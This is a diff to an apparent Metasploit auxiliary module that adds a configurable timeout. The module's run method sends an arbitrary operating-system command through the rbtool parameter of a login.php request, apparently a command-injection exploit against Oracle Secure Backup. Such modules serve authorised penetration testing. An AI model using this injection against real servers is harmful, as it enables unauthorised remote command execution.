@@ -30,24 +30,23 @@ class Metasploit3 < Msf::Auxiliary
       [
         Opt::RPORT(443),
         OptString.new('CMD', [ false, "The command to execute.", "cmd.exe /c echo metasploit > %SYSTEMDRIVE%\\metasploit.txt" ]),
-        OptBool.new('SSL',   [true, 'Use SSL', true]),
+        OptBool.new('SSL',   [ true, 'Use SSL', true ]),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 5 ])
       ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 5
   end
 
   def run
 
     r = Rex::Text.rand_text_english(2)
-
     cmd = datastore['CMD']
-
     uri = "/login.php?clear=no&ora_osb_lcookie=&ora_osb_bgcookie=#{r}&button=Logout&rbtool="
-
     req = uri + Rex::Text.uri_encode(cmd)
-
     print_status("Sending command: #{datastore['CMD']}...")
-
-    res = send_request_raw({'uri' => req,},5)
-
+    res = send_request_raw({'uri' => req,}, timeout)
     print_status("Done.")
 
   end
